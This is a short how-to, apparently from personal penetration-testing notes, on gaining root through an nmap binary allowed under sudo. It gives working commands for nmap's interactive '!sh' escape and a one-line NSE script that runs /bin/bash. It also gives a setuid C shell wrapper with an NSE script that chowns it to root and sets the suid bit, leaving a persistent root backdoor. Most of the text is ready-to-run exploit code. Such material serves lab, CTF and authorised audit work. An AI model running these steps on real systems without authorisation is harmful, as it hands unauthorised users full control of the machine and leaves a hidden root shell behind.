---
title: Privilege Escalation with Nmap
date_created: 2021-07-01
date_updated: 2021-07-01
metadata: howto
---
# Privilege Escalation with Nmap

If you have sudo rights to execute nmap, it's possible to escalate with nmap using two methods which would depend on the version installed on the machine. We can check the version of nmap using `nmap -v`.

## Nmap Interactive Mode

For nmap versions 2.02 to 5.21, an interactive mode can be used with nmap to execute shell commands. 

```bash
$ sudo nmap --interactive
> !sh
```

This should give you an elevated shell.

## Nmap Scripting Engine

Newer versions of nmap have removed the option to run in interactive mode. Instead, we can escalate privileges by executing a custom lua script using the nmap scripting feature. The `os.execute` function should provide us access to system commands.

Here's a quick and dirty script to get a root shell:

```bash
$ echo 'os.execute("/bin/bash")' > /tmp/rootme.nse
```

Execute the custom nse script with privileged nmap and you'll get root.

```bash
$ sudo nmap --script /tmp/rootme.nse
```

### Alternatives

Alternatively, you can use the nse script to set the SetUID and SetGID bits on another script which will provide a better shell experience.

Create a C script on your local machine and compile using `gcc rootme.c -o rootme`. I'd usually place this in the `/tmp/rootme` folder just to make things easier.

```C
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void){
	setuid(0); setgid(0); system("/bin/bash");
}
```

Transfer the file onto the target machine and create the following nse script. Again, run the nse script using `sudo nmap --script rootme.nse`.

```lua
author = "w0lfram1te"
categories = {"default", "safe"}

prerule = function()
	return "True"
end

action = function(prerule)
	os.execute("chown root.root /tmp/rootme")
	os.execute("chmod +sx /tmp/rootme")
	return "nmap priv escalation"
end
```